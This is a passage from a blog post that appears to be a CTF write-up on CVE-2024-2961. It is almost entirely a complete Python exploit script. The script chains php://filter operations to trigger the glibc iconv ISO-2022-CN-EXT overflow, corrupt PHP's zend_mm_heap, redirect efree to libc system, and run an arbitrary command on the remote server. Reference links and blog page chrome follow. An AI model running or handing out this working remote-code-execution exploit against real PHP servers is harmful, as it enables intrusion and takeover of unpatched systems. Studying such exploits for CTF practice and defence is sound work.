    Path(local_path).write(data)

def find_main_heap(self, regions: list[Region]) -&gt; Region:
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == &quot;rw-p&quot;
        and region.size &gt;= HEAP_SIZE
        and region.stop &amp; (HEAP_SIZE - 1) == 0
        and region.path in (&quot;&quot;, &quot;[anon:zend_alloc]&quot;)
    ]

    if not heaps:
        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)

    first = heaps[0]

    if len(heaps) &gt; 1:
        heaps = &quot;, &quot;.join(map(hex, heaps))
        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
    else:
        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)

    return first

def run(self) -&gt; None:
    self.check_vulnerable()
    self.get_symbols_and_addresses()
    self.exploit()

def build_exploit_path(self) -&gt; str:
    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the
    other. Processing generally involves making some kind of operation either
    on the chunk or in a destination chunk of the same size. Each operation is
    applied on every single chunk; you cannot make PHP apply iconv on the first 10
    chunks and leave the rest in place. That&#39;s where the difficulties come from.

    Keep in mind that we know the address of the main heap, and the libraries.
    ASLR/PIE do not matter here.

    The idea is to use the bug to make the freelist for chunks of size 0x100 point
    lower. For instance, we have the following free list:

    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00

    By triggering the bug from chunk ..900, we get:

    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???

    That&#39;s step 3.

    Now, in order to control the free list, and make it point whereever we want,
    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
    That&#39;s step 2.

    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
    a problem: after step2 has been processed, the free list goes bottom-up, like:

    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900

    We need to go the other way around. That&#39;s why we have step 1: it just allocates
    chunks. When they get freed, they reverse the free list. Now step2 allocates in
    reverse order, and therefore after step2, chunks are in the correct order.

    Another problem comes up.

    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
    Since step2 creates chunks that contain pointers and pointers are generally not
    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
    To avoid this, we put the chunks in step2 at the very end of the chain, and
    prefix them with `0\n`. When dechunked (right before the iconv), they will
    &quot;disappear&quot; from the chain, preserving them from the character set conversion
    and saving us from an unwanted processing error that would stop the processing
    chain.

    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
    don&#39;t know the precise layout of the heap, but we know that at the top of the
    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
    Its free_slot[] array contains a pointer to each free list. By overwriting it,
    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
    field contains pointers to hook functions for emalloc, efree, and erealloc
    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
    then overwrite the use_custom_heap flag to make PHP use these function pointers
    instead. We can now do our favorite CTF technique and get a call to
    system(&lt;chunk&gt;).
    We make sure that the &quot;system&quot; command kills the current process to avoid other
    system() calls with random chunk data, leading to undefined behaviour.

    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
    process is in a random state, we still get contiguous, in order chunks for our
    exploit.

    Therefore, the whole process described here CANNOT crash. Everything falls
    perfectly in place, and nothing can get in the middle of our allocations.
    &quot;&quot;&quot;

    LIBC = self.info[&quot;libc&quot;]
    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]

    ADDR_HEAP = self.info[&quot;heap&quot;]
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b&quot;\x00&quot; * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b&quot;\x00&quot; * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;

    step2_size = 0x48
    step2 = b&quot;\x00&quot; * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b&quot;\x00&quot; * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap-&gt;free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = self.command
    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
    if self.sleep:
        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
    COMMAND = COMMAND.encode() + b&quot;\x00&quot;

    assert (
            len(COMMAND) &lt;= step4_use_custom_heap_size
    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;

    filters = [
        # Create buckets
        &quot;zlib.inflate&quot;,
        &quot;zlib.inflate&quot;,

        # Step 0: Setup heap
        &quot;dechunk&quot;,
        &quot;convert.iconv.L1.L1&quot;,

        # Step 1: Reverse FL order
        &quot;dechunk&quot;,
        &quot;convert.iconv.L1.L1&quot;,

        # Step 2: Put fake pointer and make FL order back to normal
        &quot;dechunk&quot;,
        &quot;convert.iconv.L1.L1&quot;,

        # Step 3: Trigger overflow
        &quot;dechunk&quot;,
        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,

        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        &quot;convert.quoted-printable-decode&quot;,
        &quot;convert.iconv.L1.L1&quot;,
    ]
    filters = &quot;|&quot;.join(filters)
    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;

    return path

@inform(&quot;Triggering...&quot;)
def exploit(self) -&gt; None:
    path = self.build_exploit_path()
    start = time.time()

    try:
        self.remote.send(path)
    except (ConnectionError, ChunkedEncodingError):
        pass

    msg_print()

    if not self.sleep:
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
    elif start + self.sleep &lt;= time.time():
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
    else:
        # Wrong heap, maybe? If the exploited suggested others, use them!
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)

    msg_print()
</code></pre>
<p>def compress(data) -&gt; bytes:<br>    “””Returns data suitable for <code>zlib.inflate</code>.<br>    “””<br>    # Remove 2-byte header and 4-byte checksum<br>    return zlib.compress(data, 9)[2:-4]</p>
<p>def b64(data: bytes, misalign&#x3D;True) -&gt; bytes:<br>    payload &#x3D; base64.encode(data)<br>    if not misalign and payload.endswith(“&#x3D;”):<br>        raise ValueError(f”Misaligned: {data}”)<br>    return payload.encode()</p>
<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””<br>    return chunked_chunk(data, 0x8000)</p>
<p>def qpe(data: bytes) -&gt; bytes:<br>    “””Emulates quoted-printable-encode.<br>    “””<br>    return “”.join(f”&#x3D;{x:02x}” for x in data).upper().encode()</p>
<p>def ptr_bucket(*ptrs, size&#x3D;None) -&gt; bytes:<br>    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””<br>    if size is not None:<br>        assert len(ptrs) * 8 &#x3D;&#x3D; size<br>    bucket &#x3D; b””.join(map(p64, ptrs))<br>    bucket &#x3D; qpe(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; compressed_bucket(bucket)</p>
<pre><code>return bucket
</code></pre>
<p>def chunked_chunk(data: bytes, size: int &#x3D; None) -&gt; bytes:<br>    “””Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    “””<br>    # The caller does not care about the size: let’s just add 8, which is more than<br>    # enough<br>    if size is None:<br>        size &#x3D; len(data) + 8<br>    keep &#x3D; len(data) + len(b”\n\n”)<br>    size &#x3D; f”{len(data):x}”.rjust(size - keep, “0”)<br>    return size.encode() + b”\n” + data + b”\n”</p>
<p>@dataclass<br>class Region:<br>    “””A memory region.”””</p>
<pre><code>start: int
stop: int
permissions: str
path: str

@property
def size(self) -&gt; int:
    return self.stop - self.start
</code></pre>
<p>Exploit()</p>
<pre><code>
## 参考资源
1. [CVE-2024-2961技术分析](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
2. [PHP过滤器协议漏洞利用](https://xz.aliyun.com/news/14986)
3. [GNU C库安全公告](https://sourceware.org/glibc/wiki/Security%20Exceptions)
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io">Abernethy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io/2025/07/19/CVE-2024-2961/">https://sebastian-alphax.github.io/2025/07/19/CVE-2024-2961/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CVE/">CVE</a></div><div class="post-share"><div class="social-share" data-image="/img/icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img class="cover" src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">LZCTF2025</div></div><div class="info-2"><div class="info-item-1">WEBXX二把嗦 :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)BLACKLIST = [    &#x27;init&#x27;,&#x27;globals&#x27;,&#x27;builtins&#x27;,&#x27;import&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Abernethy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sebastian-AlphaX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:2926295043@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2024-2961%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-2961%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">CVE-2024-2961概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3PHP%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text">相关PHP漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XGCTF-%E8%A5%BF%E7%93%9C%E6%9D%AF-Ezzz-php%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">XGCTF 西瓜杯 Ezzz_php漏洞利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87PHP%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">目标PHP代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">字符串逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.3.</span> <span class="toc-text">完整利用脚本</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/19/CVE-2024-2961/" title="CVE-2024-2961">CVE-2024-2961</a><time datetime="2025-07-19T07:20:08.000Z" title="Created 2025-07-19 15:20:08">2025-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LZCTF2025"/></a><div class="content"><a class="title" href="/2025/07/19/LZCTF2025/" title="LZCTF2025">LZCTF2025</a><time datetime="2025-07-19T02:23:39.000Z" title="Created 2025-07-19 10:23:39">2025-07-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/hello-world/" title="Hello World">Hello World</a><time datetime="2025-07-15T02:59:01.677Z" title="Created 2025-07-15 10:59:01">2025-07-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Abernethy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>